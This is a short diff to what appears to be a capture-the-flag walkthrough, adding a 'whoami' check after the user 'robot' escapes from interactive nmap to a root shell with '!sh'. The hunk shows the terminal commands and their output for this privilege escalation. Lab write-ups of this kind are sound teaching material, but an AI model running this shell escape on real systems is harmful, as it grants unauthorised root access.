@@ -581,6 +581,8 @@ robot@linux:/tmp$ nmap --interactive
 nmap> !sh
 # id
 uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+# whoami
+root
 # cd /root
 # ls -la
 total 32
